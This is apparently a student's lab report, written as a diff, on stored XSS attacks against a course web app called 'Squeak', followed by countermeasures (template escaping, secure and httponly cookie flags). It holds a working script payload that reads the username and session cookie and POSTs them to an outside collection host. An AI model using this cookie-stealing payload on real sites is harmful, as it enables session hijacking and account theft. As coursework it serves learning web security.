@@ -1,0 +1,24 @@
+Submission 3:
+-changed a few things to keep submission2 workable.old "/" paht is now "/submission2"
+-made users like in the example with pw "12345678" and the stand user with username: daniel, pw: fisksoppa from the previous submission.
+
+Stored XSS Atack:
+The first attack with "<script>alert('Owned');</script>" was pretty straightforward. I was able to place the script as a "Squeak" and every user who logged in ran the script.	
+
+
+To get the cookies I used the following squeak and "squeaked" it 
+"<script>
+var xhttp = new XMLHttpRequest();
+console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
+ xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
+ var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
+ xhttp.send(username+":"+document.cookie);
+</script>"
+
+I tried to sign in with different users and their data were all sent to "https://dva446.herokuapp.com/store/156" and i could access it to see them.
+
+Countermeasures:
+settings the template engine up wasnt so difficult. But because i made the replacements in two steps: first replacing the values like name, card text etc. for every html snippet, combine them and then replace it in the template file. To simulate similar behaviour I used Mustache.render to render locally.
+Now everything was unescaped correctly.
+
+I also added the secure and httponly flags when i set cookies.
